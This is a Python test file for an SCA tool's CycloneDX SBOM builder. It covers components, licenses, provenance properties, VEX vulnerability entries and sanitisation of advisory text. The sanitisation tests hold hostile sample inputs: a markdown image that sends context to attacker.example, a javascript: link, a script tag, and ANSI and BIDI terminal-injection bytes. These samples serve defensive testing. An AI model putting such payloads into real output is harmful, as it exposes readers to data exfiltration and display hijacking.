"""Tests for ``packages.sca.sbom``."""

from __future__ import annotations

import json
from datetime import datetime, timezone
from pathlib import Path
from typing import List

from packages.sca.findings import build_vuln_findings
from packages.sca.models import (
    AffectedRange,
    Advisory,
    CVSSScore,
    Confidence,
    Dependency,
    PinStyle,
    Reachability,
)
from packages.sca.osv import OsvResult
from packages.sca.sbom import build_bom, write_sbom_json


def _dep(name: str = "lodash",
         version: str = "4.17.21",
         license: str | None = "MIT",
         direct: bool = True,
         ecosystem: str = "npm",
         scope: str = "main") -> Dependency:
    d = Dependency(
        ecosystem=ecosystem,
        name=name,
        version=version,
        declared_in=Path("/repo/package.json"),
        scope=scope,
        is_lockfile=False,
        pin_style=PinStyle.EXACT,
        direct=direct,
        purl=f"pkg:{ecosystem.lower()}/{name}@{version}",
        parser_confidence=Confidence("high", reason="t"),
    )
    d.declared_license = license
    return d


def _adv() -> Advisory:
    return Advisory(
        osv_id="GHSA-test",
        aliases=["CVE-2099-9999"],
        summary="Test advisory",
        details="",
        affected=[AffectedRange(type="ECOSYSTEM",
                                events=[{"introduced": "0"}, {"fixed": "5"}])],
        severity=CVSSScore(
            score=9.8,
            vector="CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H",
            severity="critical",
        ),
        fixed_versions=["5.0.0"],
        references=[],
    )


# ---------------------------------------------------------------------------
# build_bom — components
# ---------------------------------------------------------------------------

def test_components_basic_shape() -> None:
    deps = [_dep()]
    bom = build_bom(deps=deps, target_name="my-app")
    assert bom["bomFormat"] == "CycloneDX"
    assert bom["specVersion"] == "1.5"
    assert bom["metadata"]["component"]["name"] == "my-app"
    assert len(bom["components"]) == 1
    comp = bom["components"][0]
    assert comp["type"] == "library"
    assert comp["name"] == "lodash"
    assert comp["version"] == "4.17.21"
    assert comp["purl"] == "pkg:npm/lodash@4.17.21"
    assert comp["scope"] == "required"
    assert comp["licenses"] == [{"license": {"id": "MIT"}}]


def test_license_spdx_expression_uses_expression_field() -> None:
    deps = [_dep(license="(MIT OR Apache-2.0)")]
    comp = build_bom(deps=deps)["components"][0]
    assert comp["licenses"] == [{"expression": "(MIT OR Apache-2.0)"}]


def test_license_unknown_uses_name_field() -> None:
    deps = [_dep(license="The Acme Public License v0")]
    comp = build_bom(deps=deps)["components"][0]
    assert comp["licenses"] == [{"license": {
        "name": "The Acme Public License v0"
    }}]


def test_no_license_means_no_license_block() -> None:
    deps = [_dep(license=None)]
    comp = build_bom(deps=deps)["components"][0]
    assert "licenses" not in comp


def test_dedup_by_purl_merges_metadata() -> None:
    """A dep that shows up in both manifest and lockfile collapses to
    one component, with the union of populated metadata."""
    manifest_row = _dep(license="MIT", version="4.17.21")
    lockfile_row = _dep(license=None, version="4.17.21")
    bom = build_bom(deps=[manifest_row, lockfile_row])
    assert len(bom["components"]) == 1
    assert bom["components"][0]["licenses"] == [{"license": {"id": "MIT"}}]


def test_scope_mapping() -> None:
    deps = [
        _dep(name="r", scope="main"),
        _dep(name="d", scope="dev", license=None),
        _dep(name="t", scope="test", license=None),
    ]
    bom = build_bom(deps=deps)
    by_name = {c["name"]: c for c in bom["components"]}
    assert by_name["r"]["scope"] == "required"
    assert by_name["d"]["scope"] == "optional"
    assert by_name["t"]["scope"] == "optional"


def test_properties_include_raptor_extension_keys() -> None:
    comp = build_bom(deps=[_dep()])["components"][0]
    keys = {p["name"]: p["value"] for p in comp["properties"]}
    assert keys["raptor:ecosystem"] == "npm"
    assert keys["raptor:direct"] == "true"
    assert keys["raptor:is_lockfile"] == "false"
    assert keys["raptor:pin_style"] == "exact"
    # Provenance properties — let SBOM consumers see where each dep came
    # from (manifest vs Dockerfile vs GHA workflow vs ...).
    assert keys["raptor:source_kind"] in (
        "manifest", "lockfile", "dockerfile", "devcontainer",
        "shell_script", "gha_workflow",
    )
    assert keys["raptor:declared_in"]


def test_properties_surface_inline_install_provenance() -> None:
    """A dep extracted from a Dockerfile carries source_kind=dockerfile."""
    from packages.sca.models import Confidence
    from pathlib import Path
    d = Dependency(
        ecosystem="PyPI", name="semgrep", version=None,
        declared_in=Path("/x/.devcontainer/Dockerfile"),
        scope="main", is_lockfile=False,
        pin_style=PinStyle.WILDCARD, direct=True,
        purl="pkg:pypi/semgrep",
        parser_confidence=Confidence("medium", reason="test"),
        source_kind="dockerfile",
    )
    comp = build_bom(deps=[d])["components"][0]
    keys = {p["name"]: p["value"] for p in comp["properties"]}
    assert keys["raptor:source_kind"] == "dockerfile"
    assert "Dockerfile" in keys["raptor:declared_in"]


def test_properties_flag_commented_out_deps() -> None:
    """``# z3-solver==4.16.0.0`` (commented dep) gets commented_out=true."""
    from packages.sca.models import Confidence
    from pathlib import Path
    d = Dependency(
        ecosystem="PyPI", name="z3-solver", version="4.16.0.0",
        declared_in=Path("/x/requirements.txt"),
        scope="main", is_lockfile=False,
        pin_style=PinStyle.EXACT, direct=True,
        purl="pkg:pypi/z3-solver@4.16.0.0",
        parser_confidence=Confidence("high", reason="test"),
        commented_out=True,
    )
    comp = build_bom(deps=[d])["components"][0]
    keys = {p["name"]: p["value"] for p in comp["properties"]}
    assert keys["raptor:commented_out"] == "true"


def test_properties_skip_commented_out_for_uncommented() -> None:
    """The ``commented_out`` property is *only* added when truthy."""
    comp = build_bom(deps=[_dep()])["components"][0]
    keys = {p["name"]: p["value"] for p in comp["properties"]}
    assert "raptor:commented_out" not in keys


# ---------------------------------------------------------------------------
# build_bom — VEX block
# ---------------------------------------------------------------------------

def test_vex_block_cross_references_components() -> None:
    d = _dep()
    findings = build_vuln_findings(
        [d], [OsvResult(d.key(), [_adv()])],
    )
    bom = build_bom(deps=[d], vuln_findings=findings)
    assert "vulnerabilities" in bom
    vex = bom["vulnerabilities"][0]
    assert vex["id"] == "GHSA-test"
    assert vex["affects"][0]["ref"] == d.purl
    assert vex["ratings"][0]["score"] == 9.8


def test_vex_state_exploitable_when_imported() -> None:
    d = _dep()
    findings = build_vuln_findings(
        [d], [OsvResult(d.key(), [_adv()])],
        reachability={d.key(): Reachability(
            verdict="imported",
            confidence=Confidence("high", reason="t"),
            evidence=["src/x.js:10"],
        )},
    )
    bom = build_bom(deps=[d], vuln_findings=findings)
    assert bom["vulnerabilities"][0]["analysis"]["state"] == "exploitable"


def test_vex_state_not_affected_when_not_reachable() -> None:
    d = _dep()
    findings = build_vuln_findings(
        [d], [OsvResult(d.key(), [_adv()])],
        reachability={d.key(): Reachability(
            verdict="not_reachable",
            confidence=Confidence("medium", reason="no import found"),
            evidence=[],
        )},
    )
    bom = build_bom(deps=[d], vuln_findings=findings)
    assert bom["vulnerabilities"][0]["analysis"]["state"] == "not_affected"


def test_vex_kev_property_emitted() -> None:
    d = _dep()
    findings = build_vuln_findings(
        [d], [OsvResult(d.key(), [_adv()])],
    )
    findings[0].in_kev = True
    findings[0].epss = 0.97
    bom = build_bom(deps=[d], vuln_findings=findings)
    props = {p["name"]: p["value"] for p in bom["vulnerabilities"][0]["properties"]}
    assert props["raptor:in_kev"] == "true"
    assert props["raptor:epss"].startswith("0.97")


def test_no_vuln_findings_means_no_vex_section() -> None:
    bom = build_bom(deps=[_dep()])
    assert "vulnerabilities" not in bom


# ---------------------------------------------------------------------------
# write_sbom_json
# ---------------------------------------------------------------------------

def test_write_sbom_json_atomic(tmp_path: Path) -> None:
    out = tmp_path / "sbom.cdx.json"
    n = write_sbom_json(out, deps=[_dep()])
    assert n == 1
    assert all(p.suffix != ".tmp" for p in tmp_path.iterdir())
    data = json.loads(out.read_text())
    assert data["bomFormat"] == "CycloneDX"


def test_deterministic_timestamp_when_supplied() -> None:
    """``generated_at`` is honoured for reproducible builds / tests."""
    fixed = datetime(2026, 1, 1, 12, 0, tzinfo=timezone.utc)
    bom = build_bom(deps=[_dep()], generated_at=fixed)
    assert bom["metadata"]["timestamp"] == "2026-01-01T12:00:00Z"


# ---------------------------------------------------------------------------
# Advisory-text sanitisation in vulnerability.description
# ---------------------------------------------------------------------------

def _adv_with_summary(summary: str) -> Advisory:
    return Advisory(
        osv_id="GHSA-test",
        aliases=["CVE-2099-9999"],
        summary=summary,
        details="",
        affected=[AffectedRange(type="ECOSYSTEM",
                                events=[{"introduced": "0"}, {"fixed": "5"}])],
        severity=CVSSScore(
            score=9.8,
            vector="CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H",
            severity="critical",
        ),
        fixed_versions=["5.0.0"],
        references=[],
    )


def test_vex_description_strips_autofetch_markup() -> None:
    """CycloneDX consumers (Dependency-Track, OWASP CDX CLI) render
    vulnerability.description as markdown — autofetch markup in OSV
    summaries MUST be defanged before emission."""
    d = _dep()
    adv = _adv_with_summary(
        "RCE in foo. ![exfil](https://attacker.example/p?ctx=) "
        "[click](javascript:alert(1)) <script>x</script>"
    )
    findings = build_vuln_findings([d], [OsvResult(d.key(), [adv])])
    bom = build_bom(deps=[d], vuln_findings=findings)
    desc = bom["vulnerabilities"][0]["description"]
    assert "RCE in foo." in desc
    assert "![" not in desc
    assert "javascript:" not in desc
    assert "<script" not in desc


def test_vex_description_escapes_terminal_injection() -> None:
    """ANSI / BIDI bytes in the OSV summary must not survive into
    SBOM output (`cat sbom.cdx.json` shouldn't be hijack-able)."""
    d = _dep()
    adv = _adv_with_summary("harmless\x1b[31mDANGER\x1b[0m ‮text")
    findings = build_vuln_findings([d], [OsvResult(d.key(), [adv])])
    bom = build_bom(deps=[d], vuln_findings=findings)
    desc = bom["vulnerabilities"][0]["description"]
    assert "\x1b[" not in desc
    assert "‮" not in desc


def test_vex_description_caps_long_summaries() -> None:
    """Adversarial advisories with massive summaries are capped."""
    d = _dep()
    adv = _adv_with_summary("x" * 100_000)
    findings = build_vuln_findings([d], [OsvResult(d.key(), [adv])])
    bom = build_bom(deps=[d], vuln_findings=findings)
    desc = bom["vulnerabilities"][0]["description"]
    assert len(desc) <= 2000
